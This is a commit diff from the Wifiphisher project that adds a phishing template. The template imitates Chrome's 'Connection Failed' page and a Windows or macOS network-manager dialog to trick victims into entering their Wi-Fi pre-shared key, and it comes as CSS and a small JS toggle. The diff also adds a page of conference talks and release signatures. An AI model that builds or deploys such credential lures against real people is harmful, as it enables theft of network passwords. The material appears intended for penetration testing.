.nav-wrapper::after {
  clear: both;
  content: '';
  display: table;
  width: 100%;
}

.small-link {
  color: #696969;
  font-size: .875em;
}

/* Don't use the main frame div when the error is in a subframe. */
html[subframe] #main-frame-error {
  display: none;
}

/* Don't use the subframe error div when the error is in a main frame. */
html:not([subframe]) #sub-frame-error {
  display: none;
}

h1 {
  margin-top: 0;
  word-wrap: break-word;
}

.icon {
  -webkit-user-select: none;
  display: inline-block;
}

.error-code {
  display: block;
  font-size: .8em;
}

.hidden {
  display: none;
}

#suggestion {
  margin-top: 15px;
}

#suggestions-list p {
  -webkit-margin-after: 0;
}

#suggestions-list ul {
  margin-top: 0;
}

/* Offline page */
.offline {
  transition: -webkit-filter 1.5s cubic-bezier(0.65, 0.05, 0.36, 1),
              background-color 1.5s cubic-bezier(0.65, 0.05, 0.36, 1);
  will-change: -webkit-filter, background-color;
}

.offline.inverted {
  -webkit-filter: invert(100%);
  background-color: #000;
}

.offline .interstitial-wrapper {
  color: #2b2b2b;
  font-size: 1em;
  line-height: 1.55;
  margin: 0 auto;
  max-width: 600px;
  padding-top: 100px;
  width: 100%;
}

.offline .runner-container {
  height: 150px;
  max-width: 600px;
  overflow: hidden;
  position: absolute;
  top: 35px;
  width: 44px;
}

#offline-resources {
  display: none;
}

 5 changes: 5 additions & 0 deletions5  
ps/wifi_connect/config.ini
@@ -0,0 +1,5 @@
[info]
Name: Network Manager Connect
Description: Imitates the behavior of the network manager. This template shows Chrome's "Connection Failed" page and displays a network manager window through the page asking for the pre-shared key. Currently, the network managers of Windows and MAC OS are supported.
[context]
 Binary file addedBIN +4.4 KB 
ps/wifi_connect/dinosaur.png

 358 changes: 358 additions & 0 deletions358  
ps/wifi_connect/index.html
Large diffs are not rendered by default.

 148 changes: 148 additions & 0 deletions148  
ps/wifi_connect/mac-network-manager.css
@@ -0,0 +1,148 @@
.mac-wifi {
  -webkit-user-select: none;
  cursor: default;
  font-family: "Helvetica Neue", sans-serif;
  background-color: #ececec;
  border-radius: 5px;
  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
  width: 452px;
  height: 260px;
  color: black;
  position: absolute;
}

.mac-wifi .buttons {
  position: absolute;
  bottom: 0;
  right: 0;
  padding: 16px 18px 16px 16px;
}

.mac-wifi button {
  border-radius: 4px;
  background-color: white;
  border: 1px solid #c5c5c5;
  float: right;
  font-size: 82%;
  margin: 5px 5px 5px 7px;
  outline: none;
  width: 70px;
  height: 21px;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  font-weight: 400;
}

.mac-wifi button.action:enabled {
  border: 1px solid #74aafd;
  background-image: linear-gradient(#6cb3fa, #0a7eff);
  color: white;
}

.mac-wifi button:focus:active {
  background-image: linear-gradient(#4e98fa, #1469e1);
  color: white;
}

.mac-wifi .password input:focus + .glow {
  content: "";
  display: block;
  width: 248px;
  height: 20px;
  position: absolute;
  left: 169px;
  top: 115px;
  border-radius: 4px;
  border: 4px solid #94c2f3;
  z-index: 1;
}

.mac-wifi input[type=password], .mac-wifi input[type=text] {
  width: 250px;
  height: 22px;
  font-size: 80%;
  padding: 0 0 0 2px;
  border: 1px solid #ccc;
  background-image: none !important; /* avoid LastPass icon */
  position: relative;
  z-index: 2;
}

.mac-wifi input[type=password]:focus, .mac-wifi input[type=text]:focus {
  border: 1px solid #ccc;
  outline: none;
}

.mac-wifi .title {
  height: 20px;
  border-top-left-radius: 5px;
  border-top-right-radius: 5px;
  border-top: 1px solid #cecece;
  border-left: 1px solid #cecece;
  border-right: 1px solid #cecece;
  border-bottom: 1px solid #c0bfc0;
  background-image: linear-gradient(white 1%, #e8e6e8 5%, #d2d0d2 100%);
}

.mac-wifi .icon {
  float: left;
  position: relative;
  height: 200px;
}

.mac-wifi .content {
  padding: 15px;
  height: 207px;
  border: 1px solid #aeaeae;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
  border-top: none;
}

.mac-wifi .checkmark {
  margin: 0px 10px 0 67px;
  font-size: 90%;
}

.mac-wifi .checkmark label {
    padding: 0 0 0 3px;
}

.mac-wifi .description {
  margin-left: 85px;
}

.mac-wifi strong {
  user-select: none;
  display: block;
  margin: 11px 0 20px 0;
  font-size: 90%;
  line-height: 15px;
  color: black;
}

.mac-wifi .password {
  font-size: 110%;
  margin: 40px 0 7px 0;
  background-position: 150% 50% !important;
}

.mac-wifi .password label {
  float: left;
  font-size: 80%;
  margin: 2px 9px 0 0;
}

.mac-wifi button[disabled] {
  opacity: 0.4;
}

.mac-wifi .icon .question {
  position: absolute;
  left: 0;
  bottom: -6px;
}

.mac-wifi .icon .wifi-icon {
  position: relative;
  top: 7px;
}
 6 changes: 6 additions & 0 deletions6  
ps/wifi_connect/opensans.css
@@ -0,0 +1,6 @@
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(opensans.ttf) format('truetype');
}
 Binary file addedBIN +33.4 KB 
ps/wifi_connect/opensans.ttf
Binary file not shown.
 Binary file addedBIN +1.82 KB 
ps/wifi_connect/question.png

 156 changes: 156 additions & 0 deletions156  
ps/wifi_connect/style.css
@@ -0,0 +1,156 @@
body {
    font-family: 'Open Sans', sans-serif;
    background-repeat: no-repeat;
    height: 100%;
}
.network-manager {
    border-left: 1px solid #777;
    border-top: 1px solid #777;
    width: 400px;
    background-color: #3d444c;
    color: white;
    position: absolute;
    right: 0;
    bottom: 0;
}
span {
    color: #ccc;
    font-size: 90%;
}
ul:not(.chrome-list) {
    list-style: none;
    padding: 0;
    margin: 0;
}
ul:not(.chrome-list) li {
    padding: 10px 10px 20px 10px;
    clear: both;
    cursor: pointer;
}
ul:not(.chrome-list) li:hover {
    background-color: #494f58;
}
strong {
    display: block;
    margin-bottom: 5px;
}
li.selected {
    background-color: #0769b7;
}
input[type=checkbox] {
    display: none;
}
button {
    border: 1px solid transparent;
    background-color: #3987c6;
    padding: 10px 40px;
    color: white;
    font-family: 'Open Sans', sans-serif;
    font-size: 90%;
    cursor: pointer;
}
div.disconnected:after {
    content: "";
    display: table;
    clear: both;
}
button:hover {
    border: 1px solid white;
}
button.connect {
    float: right;
    clear: both;
}
button.authenticate, button.cancel {
    width: 155px;
    display: inline-block;
    margin-top: 10px;
    padding: 5px 30px;
}
button:hover {
}
.disconnected {
    display: block;
}
.connected {
    display: none;
}
div.check {
    width: 14px;
    height: 14px;
    border: 1px solid black;
    background-color: white;
    margin: 9px 5px 0 2px;
    display: inline-block;
    position: relative;
    top: 3px;
}
input[type=checkbox] + label div.check:after {
    font-family: 'Open Sans', sans-serif;
    content: '✓'; 
    color: black;
    position: absolute;
    left: 2px;
    top: -3px;
    display: block;
    width: 14px;
    height: 14px;
}
input[type=password] {
    border: 0px solid black;
    display: block;
    width: 100%;
    height: 20px;
    margin: 2px 0;
}
label {
    font-size: 90%;
    display: block;
}
a {
    color: #3987c6;
    text-decoration: none;
    padding: 10px;
    display: block;
}
div.content {
    width: 330px;
    margin-left: 43px;
    font-size: 90%;
}
div.wifi.icon {
    position: relative;
    width: 25px;
    height: 25px;
    float: left;
}
div.wifi.icon div.dot {
    position: absolute;
    right: 0;
    bottom: 0;
    width: 0;
    height: 0;
    border: 3px solid white;
    border-radius: 4px;
}
div.wifi.icon div.small {
    border: 2px solid white;
    border-radius: 50px;
    border-top-right-radius: 0px;
    border-bottom-right-radius: 0px;
    border-bottom-left-radius: 0px;
    border-right: 0;
    border-bottom: 0;
}
div.wifi.icon div.dot2 {
    width: 10px;
    height: 10px;
}
div.wifi.icon div.dot3 {
    width: 15px;
    height: 15px;
}
div.wifi.icon div.dot4 {
    width: 20px;
    height: 20px;
}
 Binary file addedBIN +5.45 KB 
ps/wifi_connect/wifi-icon.png

 5 changes: 5 additions & 0 deletions5  
ps/wifi_connect/win-behavior.js
@@ -0,0 +1,5 @@
document.getElementById('connect').onclick = function() {
    document.getElementsByClassName('disconnected')[0].style.display = 'none';
    document.getElementsByClassName('connected')[0].style.display = 'block';
    document.getElementById('password').focus();
};
 78 changes: 78 additions & 0 deletions78  
research.html
@@ -0,0 +1,78 @@
<head>
<title>Wifiphisher - Automated victim-customized phishing attacks against Wi-Fi clients</title>
<style>
    body { 
        background-color: #000405;
    }

    #content {
        font-family: monospace, prestige;
        width: 600px;
        padding: 5px 40px 20px 20px;
        font-size: 12px;
        background-color: white;
        text-align: left;
        border: 2px solid grey;
    }

    a {
        color: #006d91;
    }

    #menu {
        font-family: Arial, Helvetica, Sans-Serif;
        padding-top: 2em;
        padding-bottom: 0.1em;
        font-size: 22px;
        color: #006d91;
    }

    #menu a {
        text-decoration: none;
    }

    h1 { 
        padding-top: 5px;
        font-size: 18px;
    }

    h2 { 
        padding-top: 5px;
        font-size: 16px;
    }

    ul, ol {
        list-style-position: inside;
        padding-left: 15px;
    }
</style>
</head>
<body>
<center><img width="45%" src="logo.png"></img>
<div id="menu">
<a href="/">Intro</a> || <a href="/download.html">Download</a> || <a href="docs.html">Docs</a> || <a href="changelog.html">Changelog</a> || <a href="research.html">Research</a> 
</div>
<div id="content">
<h1>Featured Presentations</h1>
<p>Wifiphisher has been presented in security conferences, hackerspaces and open
source communities worldwide. The tool has also caught the attention of
the press in multiple occasions.</p> 

<p>Notable presentations are listed on this page.</p> 

<ul>

<li>HITBSecConf Amsterdam 2017: Lure10: Exploiting Windows Automatic Wireless Association Algorithm (<a href="https://census-labs.com/media/lure10_hitb2017ams.pdf">slides</a> | <a href="https://www.youtube.com/watch?v=p1Lt-NL7JyM">video</a>)</li>

<li>33C3 (Lightning talk): Efficient Wi-Fi Phishing (<a href="https://census-labs.com/media/effective_wifi_phishing_33c3.pdf">slides</a> | <a href="https://www.youtube.com/watch?v=q71BnIL6UGg&t=2796">video</a>)</li>

<li>BSides Athens 2016: Getting the most out of Evil Twin with Wifiphisher (<a href="https://census-labs.com/media/bsidesath2016-wifiphisher.pdf">slides</a> | <a href="https://www.youtube.com/watch?v=amA2KV5cS1o">video</a>)</li>


<li>BSides London 2015: Introducing wifiphisher (<a href="https://census-labs.com/media/bsideslondon15-wifiphisher.pdf">slides</a> | <a href="https://www.youtube.com/watch?v=pRtxFWJTS4k">video</a>)</li>

</ul>

</div>
</center>
</body>
 16 changes: 16 additions & 0 deletions16  
sigs/wifiphisher-1.2.tar.gz.asc
@@ -0,0 +1,16 @@
-----BEGIN PGP SIGNATURE-----

iQIcBAEBAgAGBQJYRMS/AAoJEPjtpEDqVV3MKAgP/2/it9w1R4jAx8ys5gzpFimY
x8EqaHVH/sJK7rKgaoaV8POCtu4VIOJcgj3tDrAQqvunuIn55t54opNMuciOCsOU
4j5K5n8dhKnqDFmoZNgDiWWoyRaRnds+EWJX2fEUOCAotrXoqMsIe5UgU/QMsc7J
LGFPA6NVmRFCn0b/DIrO7gedh9ssG5/Tj+LKWcRfg+d5lEwjpG5BAurNehUQ1MF0
qt82awpp6d9hZU/5RCDBE4hz/Z3nP+VTkMmx92yCINS6nFlnNYIwSUD4tkGQ5noK
3jRXP35usQhvrh2wtrBb6V8EuzxPufTehCD39iZ6D8SDV+cBwM0/E5z+sPHlZ/C4
YabA+3c/tVrxoqUJk8J6b7k1cmStuRNtpl7frKalobOAjwwii79Kmxq/51eurN7w
XxAYS3+3ImhXYlh5xN8xaGB7rGS5uWHzrGixAUwtmjjtX1DsuVV9q8iZ2hchjg8p
5tWtFFpmvLvDpHeq3qZSo20rtrB8M/SO3ArM+/C9jlZO+AQxCBKXIXGGsmKxm9Fl
3CnFBHEbm0SujBJ/h1fc1RR6DF4UPn0lUV5WIXI4eteTPdpMRZ8gGZN09M5EY4y6
1BxuOY42K4iNH2lojbpKnsil3e1kDMJPh4ILU1GBAkRT78t4Wz5lw7XwBOyycuct
Cl5+8DHB0tTvjZ3gaFwP
=MDBk
-----END PGP SIGNATURE-----
 2 changes: 2 additions & 0 deletions2  
sigs/wifiphisher-1.2.tar.gz.sha256
@@ -0,0 +1,2 @@
wifiphisher-1.2.tar.gz: BDC6FB23 70FC4EE7 6FAEEE41 C94EDD3E 2AC6A316 9F8B0179
                        C56F8110 68BA67D9
 16 changes: 16 additions & 0 deletions16  
sigs/wifiphisher-1.3.tar.gz.asc
@@ -0,0 +1,16 @@
-----BEGIN PGP SIGNATURE-----

iQIcBAABAgAGBQJY8elMAAoJEPjtpEDqVV3MGtoP/2ungheJ7kIbUPgBjsgqPJ3v
KoIBAVD7vFMLM6L1qvgJ03MNJhH9NphiZ1jZuBcdhQIQn6gmTtgjVCxuPrGiyNPK
vE57caA0w9hQ3xAc0U/z6xWAKpe6T4ZUIIgpUh1lChbpc2csyhjwGeqGsjFIcaCr
d+u9b32cLstBiuxLPIpZiArkgdskJ7/tIaOMikrv2GfzpmIXQqxFAGz4Z2CHrwZ4
BcBEa3VxE+2oKNYVroUYX0KGijLI3M3zQ6GWCQv6cE4MYHvI/7o92d/YtfPLvmmc
Thm50+Tmu9gGAHzZ8M/0c8RnP/qxcgWY5PmRLm+adi3aLMByqafHhA0THiU5752W
1Q7Ylho9GSif8L8j/PHUnhM5vMJEFNcjZ2SkjrasFJJCejGeT71WyvfNvuxZ1DGJ
yKeV/x1SiGlqxeJDJqGG0UwDkrGkUPWQWeYr6ZrQDtdMCupLuGt25bYkj5JvnO7v
E+SrP7aLYQewvoU3AnGzYlA7Ct/YkINDXHDl8d6y0h+OiwkTS/5rpClQb1d1dmiO
3T5VfudH6Zyd+UMrGv7zClOqRN2OX1+rSqgqLhDDoWci0No2M0c1TYYU4w3toVfQ
9jlRuPnybVxSZNYA3q2WVdW9dS5hnSqAGrHh162l7fjTx661nlvjJAYU4Cf5tAYr
X6NCUzBP0mHSL54o5VZ3
=Um3O
-----END PGP SIGNATURE-----
 2 changes: 2 additions & 0 deletions2  
sigs/wifiphisher-1.3.tar.gz.sha256
@@ -0,0 +1,2 @@
v1.3.tar.gz: 9D125C6A ADF1A838 905B98B0 2F8EFAD1 4AAC9B87 89CF1B9C CAA4B9F1
             49CE580A
